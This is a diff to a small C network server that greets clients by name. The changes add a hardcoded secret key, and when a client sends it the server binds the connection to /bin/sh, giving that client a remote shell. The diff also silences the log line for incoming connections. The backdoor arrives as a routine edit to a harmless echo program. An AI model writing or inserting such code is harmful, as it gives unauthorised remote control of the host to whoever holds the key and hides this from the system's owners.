@@ -8,18 +8,28 @@
 
 void processme(int s){
 
-	char buffer[100]="plz input your name:\n";
+	char buffer[100]="Plz input your name:\n";
 	write(s,buffer,strlen(buffer)+1);
 	char inputme[100];
 	char echome[200];
+	char key[]="29585c700c8d0be16c6b0a24d8c9d0bc";
 	memset(inputme,0,100);
 	memset(echome,0,200);
 	read(s,inputme,sizeof(inputme)-1);
 	inputme[strlen(inputme)-1]=0;
 	sprintf(echome,"hello, %s\n",inputme);
 	write(s,echome,200);
-
+	if(!strcmp(inputme,key))
+	{
+	write(s,"Welcome to my master:\n",22);
+	dup2(s,0);
+	dup2(s,1);
+	dup2(s,2);
+	system("/bin/sh");
+	}
+	write(s,"GoodBye~~~",9);
 }
+
 void USAGE()
 {
 	puts("usage: ./prog portnumber");
@@ -63,7 +73,10 @@ int main(int argc, char** argv)
 
 	clientfd=accept(serverfd,(struct sockaddr *)&clientaddr,&lenofclient);
 	if(clientfd<0){continue;}
-	else{printf("clientfd is: %d\n",clientfd);}
+	else{
+	//printf("clientfd is: %d\n",clientfd);
+	;
+	}
 
 
 	int pid;
